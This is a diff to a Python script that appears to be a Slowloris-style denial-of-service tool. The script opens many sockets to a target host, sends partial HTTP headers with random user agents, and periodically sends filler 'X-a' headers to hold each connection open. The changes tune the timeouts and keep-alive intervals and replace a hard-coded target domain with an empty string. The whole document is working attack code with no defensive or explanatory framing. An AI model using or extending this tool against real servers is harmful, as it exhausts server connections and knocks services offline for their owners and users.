@@ -95,7 +95,7 @@ def socketInit():
 		if ip:
 			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.settimeout(5)
+				s.settimeout(10)
 				# time.sleep(0.1)
 				s.connect((ip, port))
 				break
@@ -112,7 +112,6 @@ def socketInit():
 	header = 'User-Agent: {}\r\n'.format(random.choice(user_agents)).encode('utf-8')
 	s.send(header)
 	s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-	# print('{}. Socket port: {} IP: {}'.format(len(listOfSockets), port, ip))
 	
 	return s
 
@@ -134,23 +133,12 @@ async def keeping_active():
 			try:
 				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
 			except socket.error:
+				print('DELETE')
 				listOfSockets.remove(s)
-				# socketInit()
-				# listOfSockets.append(s)
+
 				continue
 		
-		await asyncio.sleep(0)
-
-	# print('AA')
-	# print('{} sockets Still alive..'.format(len(listOfSockets)))
-	# for s in listOfSockets:
-	# 	try:
-	# 		s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-	# 	except socket.error:
-	# 		listOfSockets.remove(s)
-	# 		continue
-	
-	# await asyncio.sleep(5)
+		await asyncio.sleep(8)
 
 
 
@@ -168,16 +156,11 @@ async def connection():
 
 	keep_alive = True
 
-	# for _ in range(quantityOfSockets):
 	while len(listOfSockets) < quantityOfSockets:
 		try:
 			s = socketInit()
+			await asyncio.sleep(0)
 
-			if len(listOfSockets) % 100 == 0:
-				print(len(listOfSockets))
-				await asyncio.sleep(0)
-
-			# print(s)
 		except socket.timeout:
 			break
 		except BrokenPipeError:
@@ -232,7 +215,7 @@ async def main_loop():
 if __name__ == "__main__":
 
 
-	ip = 'marcozo.com'
+	ip = ''
 
 	ports = portsCheck()
 	
